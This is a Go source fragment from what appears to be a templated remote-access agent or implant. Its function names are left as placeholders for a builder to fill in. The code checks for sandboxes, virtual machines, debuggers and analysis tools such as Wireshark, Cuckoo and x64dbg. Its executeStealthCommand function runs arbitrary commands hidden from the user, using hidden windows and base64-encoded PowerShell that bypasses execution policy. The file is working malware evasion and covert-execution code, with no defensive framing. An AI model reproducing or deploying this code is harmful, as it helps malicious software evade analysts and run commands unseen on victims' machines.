
// Sandbox and debugger checks functionality
func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_SANDBOX_FUNC}() bool {
	if a.{AGENT_DISABLE_SANDBOX_FIELD} {
		return false
	}

	cpuCount := runtime.NumCPU()
	if cpuCount < 2 {
		return true
	}

	var totalRAM uint64
	// Windows-specific sandbox checks
	if os.Getenv("VBOX_SHARED_FOLDERS") != "" ||
	   os.Getenv("VBOX_SESSION") != "" ||
	   strings.Contains(os.Getenv("COMPUTERNAME"), "SANDBOX") ||
	   strings.Contains(os.Getenv("COMPUTERNAME"), "SND") {
		return true
	}

	if totalRAM > 0 && totalRAM < 2*1024*1024*1024 { // Less than 2GB
		return true
	}

	hostname, _ := os.Hostname()
	hostnameLower := strings.ToLower(hostname)
	sandboxIndicators := []string{
		"sandbox", "malware", "detected", "test",
		"cuckoo", "malbox", "innotek",
		"virtual", "vmware", "vbox", "xen",
	}
	for _, indicator := range sandboxIndicators {
		if strings.Contains(hostnameLower, indicator) {
			return true
		}
	}

	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}
	if username == "" {
		username = "unknown"
	}
	usernameLower := strings.ToLower(username)
	suspiciousUsers := []string{"sandbox", "malware", "user", "test", "admin"}
	for _, user := range suspiciousUsers {
		if usernameLower == user {
			return true
		}
	}

	interfaces, err := net.Interfaces()
	if err == nil {
		virtualMacPrefixes := []string{"08:00:27", "00:0c:29", "00:50:56", "00:1c:42", "52:54:00"}
		for _, iface := range interfaces {
			mac := iface.HardwareAddr.String()
			mac = strings.ToLower(mac)
			for _, prefix := range virtualMacPrefixes {
				if strings.HasPrefix(mac, prefix) {
					return true
				}
			}
		}
	}

	if a.{AGENT_CHECK_WINDOWS_PROCESSES_FOR_SANDBOX_FUNC}() {
		return true
	}

	currentPath, _ := os.Getwd()
	currentPath = strings.ToLower(currentPath)
	suspiciousPaths := []string{
		"vmware", "virtualbox", "vbox",
		"sandbox", "cuckoo", "cape", "malware",
	}
	for _, path := range suspiciousPaths {
		if strings.Contains(currentPath, path) {
			return true
		}
	}

	envSandboxIndicators := []string{
		"SANDBOX", "CUCKOO", "CAPE", "MALWARE",
		"VIRUSTOTAL", "HYBRID", "ANYRUN",
	}
	for _, envVar := range envSandboxIndicators {
		if os.Getenv(envVar) != "" || os.Getenv(strings.ToLower(envVar)) != "" {
			return true
		}
	}


	suspiciousFiles := []string{
		"C:\\windows\\temp\\vmware_trace.log",  // VMware
		"C:\\windows\\temp\\VirtualBox.log",   // VirtualBox
		"C:\\windows\\system32\\drivers\\VBoxMouse.sys",  // VBox
		"/tmp/vmware_trace.log",  // VMware on Linux
		"/tmp/vbox_mouse.log",    // VBox on Linux
	}
	for _, file := range suspiciousFiles {
		if _, err := os.Stat(file); err == nil {
			return true // File exists
		}
	}

	if a.{AGENT_CHECK_NETWORK_TOOLS_FUNC}() {
		return true
	}

	return false
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_WINDOWS_PROCESSES_FOR_SANDBOX_FUNC}() bool {
	output, err := a.executeStealthCommand("tasklist")
	if err != nil {
		return false
	}

	processes := output
	sandboxProcesses := []string{
		"cape", "fakenet", "wireshark", "tcpdump", "ollydbg",
		"x32dbg", "x64dbg", "ida", "gdb", "devenv", "procmon",
		"procexp", "sniff", "netmon", "apimonitor", "regmon",
		"filemon", "immunity", "windbg", "fiddler", "apimon",
		"regmon", "sandbox", "cuckoo", "cape", "malware",
	}

	for _, proc := range sandboxProcesses {
		if strings.Contains(strings.ToLower(processes), strings.ToLower(proc)) {
			return true
		}
	}

	return false
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_NETWORK_TOOLS_FUNC}() bool {
	if a.{AGENT_DISABLE_SANDBOX_FIELD} {
		return false
	}

	// Only support Windows platform
	output, err := a.executeStealthCommand("tasklist")
	if err != nil {
		return false
	}
	processes := output

	networkTools := []string{
		"wireshark", "tcpdump", "tshark", "netsniff", "ettercap", "burp", "mitmproxy",
		"fiddler", "charles", "netcat", "ncat", "socat", "nmap", "zmap", "masscan",
		"theharvester", "maltego", "nessus", "openvas", "nessusd", "snort", "suricata",
		"procmon", "procexp",
	}

	for _, tool := range networkTools {
		if strings.Contains(strings.ToLower(processes), tool) {
			return true
		}
	}

	return false
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_DEBUGGERS_FUNC}() bool {
	if a.{AGENT_DISABLE_SANDBOX_FIELD} {
		return false
	}

	if a.{AGENT_CHECK_WINDOWS_PROCESSES_FOR_DEBUGGERS_FUNC}() {
		return true
	}

	if a.{AGENT_CHECK_WINDOWS_DEBUGGER_FUNC}() {
		return true
	}

	start := time.Now()
	time.Sleep(10 * time.Millisecond)
	actualSleep := time.Since(start)
	expectedSleep := 10 * time.Millisecond
	if actualSleep < expectedSleep/2 || actualSleep > expectedSleep*2 {
		return true
	}

	return false
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_WINDOWS_PROCESSES_FOR_DEBUGGERS_FUNC}() bool {
	output, err := a.executeStealthCommand("tasklist")
	if err != nil {
		return false
	}

	processes := output
	debuggerProcesses := []string{
		"gdb", "gdbserver", "ollydbg", "x32dbg", "x64dbg", "ida", "windbg",
		"immunity", "devenv", "vsdebug", "msvsmon", "apimonitor", "regmon", "filemon",
	}

	for _, dbg := range debuggerProcesses {
		if strings.Contains(strings.ToLower(processes), strings.ToLower(dbg)) {
			return true
		}
	}

	return false
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_WINDOWS_DEBUGGER_FUNC}() bool {
	if runtime.GOOS != "windows" || a.{AGENT_DISABLE_SANDBOX_FIELD} {
		return false
	}

	psCommand := "[System.Diagnostics.Debugger]::IsDebuggerPresent()"
	output, err := a.executeStealthCommand(psCommand)
	if err != nil {
		return false
	}

	result := strings.TrimSpace(output)
	if strings.Contains(strings.ToLower(result), "true") {
		return true
	}

	return false
}


// executeStealthCommand executes a command using Windows API calls to hide the console window
func (a *{AGENT_STRUCT_NAME}) executeStealthCommand(command string) (string, error) {
	if runtime.GOOS != "windows" {
		// For non-Windows systems, use regular execution
		cmd := exec.Command("sh", "-c", command)
		output, err := cmd.CombinedOutput()
		if err != nil {
			return fmt.Sprintf("[ERROR] Command execution failed: %v", err), nil
		}
		if len(output) > 1024*1024 { // 1MB limit
			output = append(output[:1024*1024], []byte("\n[OUTPUT TRUNCATED: Max size reached]")...)
		}
		return string(output), nil
	}

	// Detect if this is a PowerShell command
	isPowerShell := false
	cmdLower := strings.ToLower(command)
	powerShellPatterns := []string{"$", "get-", "set-", "new-", "remove-", "invoke-", "select-", "where-", "foreach-",
		"out-", "export-", "import-", "write-", "read-", "clear-", "update-", "get-service", "get-wmiobject",
		"get-ciminstance", "start-process", "stop-service", "restart-service", "set-service", "try {",
		"catch {", "finally {", "get-itemproperty", "set-itemproperty", "new-object", "add-type"}

	patternCount := 0
	for _, pattern := range powerShellPatterns {
		if strings.Contains(cmdLower, pattern) {
			patternCount++
			if patternCount >= 2 {
				isPowerShell = true
				break
			}
		}
	}
	if !isPowerShell && patternCount > 0 {
		if strings.Contains(cmdLower, "$") && (strings.Contains(cmdLower, " = ") || strings.Contains(cmdLower, "=")) {
			isPowerShell = true
		}
	}

	// Create anonymous pipes for capturing output
	var saAttr SECURITY_ATTRIBUTES
	saAttr.NLength = uint32(unsafe.Sizeof(saAttr))
	saAttr.bInheritHandle = 1 // Set inherit handle to true
	saAttr.LPSecurityDescriptor = 0

	// Create stdout pipe
	var stdoutRead, stdoutWrite uintptr
	ret, _, _ := procCreatePipe.Call(
		uintptr(unsafe.Pointer(&stdoutRead)),
		uintptr(unsafe.Pointer(&stdoutWrite)),
		uintptr(unsafe.Pointer(&saAttr)),
	)
	if ret == 0 {
		return "", fmt.Errorf("failed to create stdout pipe")
	}

	// Create stderr pipe
	var stderrRead, stderrWrite uintptr
	ret, _, _ = procCreatePipe.Call(
		uintptr(unsafe.Pointer(&stderrRead)),
		uintptr(unsafe.Pointer(&stderrWrite)),
		uintptr(unsafe.Pointer(&saAttr)),
	)
	if ret == 0 {
		syscall.CloseHandle(syscall.Handle(stdoutRead))
		syscall.CloseHandle(syscall.Handle(stdoutWrite))
		return "", fmt.Errorf("failed to create stderr pipe")
	}

	// Prepare the command line
	var cmdLine *uint16
	var shell string
	if isPowerShell {
		// Use PowerShell with hidden window and bypass execution policy
		encodedCommand := base64.StdEncoding.EncodeToString([]byte(command))
		// Use -EncodedCommand with proper parameters to avoid CLIXML
		shell = fmt.Sprintf("powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -NonInteractive -Command \"[Console]::OutputEncoding=[System.Text.Encoding]::UTF8; $script = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%s')); $output = & ([scriptblock]::Create($script)) | Out-String; Write-Output $output\"", encodedCommand)
	} else {
		// Use cmd for regular commands
		shell = fmt.Sprintf("cmd /C %s", command)
	}
	cmdLine, err := syscall.UTF16PtrFromString(shell)
	if err != nil {
		syscall.CloseHandle(syscall.Handle(stdoutRead))
		syscall.CloseHandle(syscall.Handle(stdoutWrite))
		syscall.CloseHandle(syscall.Handle(stderrRead))
		syscall.CloseHandle(syscall.Handle(stderrWrite))
		return "", err
	}

	// Initialize STARTUPINFO structure with pipe handles
	var si STARTUPINFO
	si.Cb = uint32(unsafe.Sizeof(si))
	si.Flags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES
	si.ShowWindow = SW_HIDE // Hide the window
	si.StdInput = 0        // Use default input
	si.StdOutput = stdoutWrite // Redirect stdout to our pipe (child writes to this)
	si.StdError = stderrWrite  // Redirect stderr to our pipe (child writes to this)

	// Initialize PROCESS_INFORMATION structure
	var pi PROCESS_INFORMATION

	// Create the process with hidden window and redirected output
	err = createProcess(
		nil, // applicationName
		cmdLine, // commandLine
		nil, // processAttributes
		nil, // threadAttributes
		true, // inheritHandles - important for pipe inheritance
		CREATE_NO_WINDOW, // creationFlags - this is key for hiding the window
		0, // environment
		nil, // currentDirectory
		&si, // startupInfo
		&pi, // processInformation
	)

	if err != nil {
		syscall.CloseHandle(syscall.Handle(stdoutRead))
		syscall.CloseHandle(syscall.Handle(stdoutWrite))
		syscall.CloseHandle(syscall.Handle(stderrRead))
		syscall.CloseHandle(syscall.Handle(stderrWrite))
		return "", err
	}

	// Close the write handles for both PowerShell and regular commands
	syscall.CloseHandle(syscall.Handle(stdoutWrite))
	syscall.CloseHandle(syscall.Handle(stderrWrite))

	defer syscall.CloseHandle(syscall.Handle(pi.Process))
	defer syscall.CloseHandle(syscall.Handle(pi.Thread))

	stdoutChan := make(chan []byte)
	stderrChan := make(chan []byte)

	go func() {
		var stdoutBytes []byte
		var buffer [4096]byte
		var bytesRead uint32
		totalRead := 0
		const maxSize = 1024 * 1024 // 1MB limit

		for {
			// Check if we've reached the size limit
			if totalRead >= maxSize {
				stdoutBytes = append(stdoutBytes, []byte("\n[OUTPUT TRUNCATED: Max size reached]")...)
				break
			}

			ret, _, _ := procReadFile.Call(
				stdoutRead,
				uintptr(unsafe.Pointer(&buffer[0])),
				uintptr(len(buffer)),
				uintptr(unsafe.Pointer(&bytesRead)),
				0,
			)

			// Only continue if we successfully read data and haven't exceeded size
			if ret == 0 || bytesRead == 0 {
				break
			}

			// Check if adding this chunk would exceed our size limit
			if totalRead + int(bytesRead) > maxSize {
				// Only add what fits within our limit
				remaining := maxSize - totalRead
				stdoutBytes = append(stdoutBytes, buffer[:remaining]...)
				stdoutBytes = append(stdoutBytes, []byte("\n[OUTPUT TRUNCATED: Max size reached]")...)
				break
			}

			stdoutBytes = append(stdoutBytes, buffer[:bytesRead]...)
			totalRead += int(bytesRead)
		}
		stdoutChan <- stdoutBytes
	}()

	go func() {
		var stderrBytes []byte
		var buffer [4096]byte
		var bytesRead uint32
		totalRead := 0
		const maxSize = 1024 * 1024 // 1MB limit

		for {
			// Check if we've reached the size limit
			if totalRead >= maxSize {
				stderrBytes = append(stderrBytes, []byte("\n[OUTPUT TRUNCATED: Max size reached]")...)
				break
			}

			ret, _, _ := procReadFile.Call(
				stderrRead,
				uintptr(unsafe.Pointer(&buffer[0])),
				uintptr(len(buffer)),
				uintptr(unsafe.Pointer(&bytesRead)),
				0,
			)

			// Only continue if we successfully read data and haven't exceeded size
			if ret == 0 || bytesRead == 0 {
				break
			}

			// Check if adding this chunk would exceed our size limit
			if totalRead + int(bytesRead) > maxSize {
				// Only add what fits within our limit
				remaining := maxSize - totalRead
				stderrBytes = append(stderrBytes, buffer[:remaining]...)
				stderrBytes = append(stderrBytes, []byte("\n[OUTPUT TRUNCATED: Max size reached]")...)
				break
			}

			stderrBytes = append(stderrBytes, buffer[:bytesRead]...)
			totalRead += int(bytesRead)
		}
		stderrChan <- stderrBytes
	}()

	result, err := syscall.WaitForSingleObject(syscall.Handle(pi.Process), 60000) // 60 second timeout
	if err != nil || result == syscall.WAIT_TIMEOUT {
		// If timeout occurs, try to terminate the process gracefully
		syscall.TerminateProcess(syscall.Handle(pi.Process), 255)
		return fmt.Sprintf("[ERROR] Command execution timed out after 60 seconds"), nil
	}

	stdoutBytes := <-stdoutChan
	stderrBytes := <-stderrChan

	// Close the read handles
	syscall.CloseHandle(syscall.Handle(stdoutRead))
	syscall.CloseHandle(syscall.Handle(stderrRead))

	output := string(stdoutBytes) + string(stderrBytes)

	// Get the exit code of the process
	var exitCode uint32
	procGetExitCodeProcess.Call(
		uintptr(pi.Process),
		uintptr(unsafe.Pointer(&exitCode)),
	)

	// If no output and process exited with error, return error info
	if len(output) == 0 && exitCode != 0 {
		return fmt.Sprintf("[ERROR] Command execution failed with exit code: %d", exitCode), nil
	}

	// For PowerShell commands, we need to clean up CLIXML output if present
	if isPowerShell {
		// Remove CLIXML header if present
		if strings.Contains(output, "#< CLIXML") {
			// Remove the CLIXML header
			output = strings.Replace(output, "#< CLIXML\n", "", 1)

			// Remove CLIXML error tags (S, E) and convert them to plain text
			// These are PowerShell's internal XML formatting tags
			output = strings.ReplaceAll(output, "<S S=\"Error\">", "")
			output = strings.ReplaceAll(output, "</S>", "")
			output = strings.ReplaceAll(output, "<S S=\"Output\">", "")
			output = strings.ReplaceAll(output, "<S S=\"Info\">", "")
			output = strings.ReplaceAll(output, "<S S=\"Warning\">", "")
			output = strings.ReplaceAll(output, "<S S=\"Verbose\">", "")
			output = strings.ReplaceAll(output, "<S S=\"Debug\">", "")
			output = strings.ReplaceAll(output, "_x000D__x000A_", "\r\n")
			output = strings.ReplaceAll(output, "_x000A_", "\n")
			output = strings.ReplaceAll(output, "_x000D_", "\r")

			// Handle PowerShell progress objects and other XML elements
			// Look for <Obj> tags and their content which are PowerShell's internal objects
			for {
				objStart := strings.Index(output, "<Obj")
				if objStart == -1 {
					break
				}
				objEnd := strings.Index(output[objStart:], "</Obj>")
				if objEnd == -1 {
					break
				}
				objEnd = objStart + objEnd + 6 // +6 for "</Obj>"
				output = output[:objStart] + output[objEnd:]
			}

			// Also handle other PowerShell XML objects like <TN> (Type Name), <MS> (Member Set), etc.
			for {
				tagStart := strings.Index(output, "<TN")
				if tagStart == -1 {
					break
				}
				tagEnd := strings.Index(output[tagStart:], "</TN>")
				if tagEnd == -1 {
					break
				}
				tagEnd = tagStart + tagEnd + 5 // +5 for "</TN>"
				output = output[:tagStart] + output[tagEnd:]
			}

			for {
				tagStart := strings.Index(output, "<MS")
				if tagStart == -1 {
					break
				}
				tagEnd := strings.Index(output[tagStart:], "</MS>")
				if tagEnd == -1 {
					break
				}
				tagEnd = tagStart + tagEnd + 5 // +5 for "</MS>"
				output = output[:tagStart] + output[tagEnd:]
			}

			// Remove any remaining XML-like tags
			for {
				start := strings.Index(output, "<")
				if start == -1 {
					break
				}
				end := strings.Index(output[start:], ">")
				if end == -1 {
					break
				}
				end = start + end + 1
				output = output[:start] + output[end:]
			}
		}
	}

	if output == "" {
		return "[Command executed successfully - no output]", nil
	}

	return output, nil
}

